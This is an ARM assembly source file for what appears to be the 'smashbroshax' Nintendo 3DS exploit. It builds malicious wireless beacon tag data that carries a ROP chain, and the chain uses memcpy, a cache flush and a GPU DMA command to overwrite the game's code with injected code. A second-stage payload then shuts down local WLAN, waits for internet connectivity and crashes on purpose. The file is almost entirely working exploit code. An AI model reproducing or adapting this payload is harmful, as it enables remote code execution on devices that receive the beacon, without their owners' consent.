.arm
.section .init
.global _start

#include "smashbroshax.h"

@ Beacon tag data for custom OUI-type 0x80. The inital ROP-chain in smashbros_beaconoui15.s loads this ROP-chain data.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI
.byte 0x80 @ OUI type

ropstart:
.word POP_LRPC
.word POP_PC @ lr

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, dst
.word (arm11code-_start) + BEACONTAGDATA_OUITYPE80_ADR @ r1, src
.word 0x400 @ r2, size
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word MEMCPY

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, buf
.word 0x400 @ r1, size
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word GSPGPU_FLUSHDCACHE

.word POP_LRPC
.word POP_R0R4SLIPPC @ lr

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, srcaddr
.word 0x30000000+TEXT_FCRAMOFFSET @ r1, dstaddr
.word 0x400 @ r2, size
.word 0 @ r3, width0
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word GXLOW_CMD4

.word 0 @ sp0 height0
.word 0 @ sp4 width1
.word 0 @ sp8 height1
.word 0x8 @ sp12 flags
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word POP_R0R4SLIPPC
.word 1000000000 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word POP_LRPC
.word POP_PC @ lr

.word SVCSLEEPTHREAD @ Delay 1 second so that the above cmd can finish, then jump to the loaded code.

.word 0x00100000

arm11code:
add r1, pc, #1
bx r1
.thumb

ldr r0, =LOCALWLAN_SHUTDOWN
blx r0

bl ACU_WaitInternetConnection

blx crasharm

.pool

.fill ((_start + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.

tag1:
.byte 0x00, 0x1f, 0x32 @ OUI
.byte 0x81 @ OUI type

tag1_code:

srv_init: @ r0 = srv handle*
push {r1, r2, r4, r5, lr}
mov r4, r0

mov r1, #0
ldr r0, =0x3a767273
str r0, [sp, #0]
str r1, [sp, #4]

mov r1, sp
mov r0, r4
blx svcConnectToPort
cmp r0, #0
bne srv_init_end

blx get_cmdbufptr
mov r5, r0

ldr r1, =0x00010002
str r1, [r5, #0]
mov r1, #0x20
str r1, [r5, #4]

ldr r0, [r4]
blx svcSendSyncRequest
cmp r0, #0
bne srv_init_end
ldr r0, [r5, #4]

srv_init_end:
pop {r1, r2, r4, r5, pc}
.pool

srv_GetServiceHandle: @ r0 = srv handle*, r1 = out handle*, r2 = servicename, r3=servlen
push {r3, r4, r5, r6, r7, lr}
mov r5, r0
mov r6, r1
mov r7, r2

blx get_cmdbufptr
mov r4, r0

ldr r1, =0x00050100
str r1, [r4, #0]
add r1, r4, #4

ldr r2, [r7, #0]
ldr r3, [r7, #4]
str r2, [r1, #0]
str r3, [r1, #4]

ldr r2, [sp, #0]
str r2, [r4, #12]
mov r2, #0
str r2, [r4, #16]

ldr r0, [r5]
blx svcSendSyncRequest
cmp r0, #0
bne srv_GetServiceHandle_end

ldr r0, [r4, #4]
cmp r0, #0
bne srv_GetServiceHandle_end

ldr r1, [r4, #12]
str r1, [r6]

srv_GetServiceHandle_end:
pop {r3, r4, r5, r6, r7, pc}
.pool

ACU_GetWifiStatus:
push {r0, r1, r4, lr}
blx get_cmdbufptr
mov r4, r0

mov r1, #0xd
lsl r1, r1, #16
str r1, [r4, #0]

ldr r0, [sp, #0]
ldr r0, [r0]
blx svcSendSyncRequest
cmp r0, #0
bne ACU_GetWifiStatus_end
ldr r0, [r4, #4]
ldr r2, [sp, #4]
ldr r1, [r4, #8]
str r1, [r2]

ACU_GetWifiStatus_end:
pop {r1, r2, r4, pc}
.pool

ACU_WaitInternetConnection:
push {lr}
sub sp, sp, #12
add r0, sp, #0
bl srv_init

add r0, sp, #0
add r1, sp, #4
add r2, sp, #8
ldr r3, =0x753a6361
str r3, [r2]
mov r3, #4
bl srv_GetServiceHandle

ACU_WaitInternetConnection_lp:
add r0, sp, #4
add r1, sp, #8
bl ACU_GetWifiStatus
cmp r0, #0
bne ACU_WaitInternetConnection_lp
ldr r0, [sp, #8]
cmp r0, #1
bne ACU_WaitInternetConnection_lp

ldr r0, [sp, #4]
blx svcCloseHandle

ldr r0, [sp, #0]
blx svcCloseHandle

add sp, sp, #12
pop {pc}
.pool

.thumb

.fill ((tag1 + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.

tag2:
.byte 0x00, 0x1f, 0x32 @ OUI
.byte 0x81 @ OUI type

tag2_code:
.arm

.type svcConnectToPort, %function
svcConnectToPort:
	str r0, [sp,#-0x4]!
	svc 0x2D
	ldr r3, [sp], #4
	str r1, [r3]
	bx lr

.type svcCloseHandle, %function
svcCloseHandle:
svc 0x23
bx lr

.type svcSendSyncRequest, %function
svcSendSyncRequest:
svc 0x32
bx lr

.type get_cmdbufptr, %function
get_cmdbufptr:
mrc 15, 0, r0, cr13, cr0, 3
add r0, r0, #0x80
bx lr

crasharm:
.word 0xffffffff

.fill ((tag2 + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff

